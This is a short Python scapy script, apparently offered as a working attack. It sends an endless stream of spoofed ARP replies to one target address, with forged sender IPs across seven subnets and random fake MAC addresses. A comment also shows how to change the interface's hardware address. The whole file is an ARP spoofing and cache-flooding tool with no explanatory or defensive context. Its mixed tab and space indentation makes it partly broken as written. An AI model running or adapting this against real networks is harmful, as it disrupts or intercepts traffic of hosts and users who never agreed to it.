#!/usr/bin/python
import os
#sudo ifconfig eth2 hw ether b8:ca:3a:af:a7:09
from scapy.all import *
import random
destip="192.168.35.17"
while(1):
    for b in xrange(2, 254):
    	x=random.randint(10, 99)
    	y=random.randint(10, 99)
    	z=random.randint(10, 99)
	send(ARP(psrc="192.168.31."+str(b), hwsrc="11:22:33:"+str(x)+":"+str(y)+":"+str(z), pdst=destip))
	send(ARP(psrc="192.168.32."+str(b), hwsrc="11:22:33:"+str(y)+":"+str(x)+":"+str(z), pdst=destip))
	send(ARP(psrc="192.168.33."+str(b), hwsrc="11:22:33:"+str(z)+":"+str(y)+":"+str(z), pdst=destip))
	send(ARP(psrc="192.168.34."+str(b), hwsrc="11:22:33:"+str(x)+":"+str(z)+":"+str(z), pdst=destip))
	send(ARP(psrc="192.168.35."+str(b), hwsrc="11:22:33:"+str(x)+":"+str(y)+":"+str(x), pdst=destip))
	send(ARP(psrc="192.168.36."+str(b), hwsrc="11:22:33:"+str(x)+":"+str(x)+":"+str(z), pdst=destip))
	send(ARP(psrc="192.168.37."+str(b), hwsrc="11:22:33:"+str(y)+":"+str(y)+":"+str(x), pdst=destip))
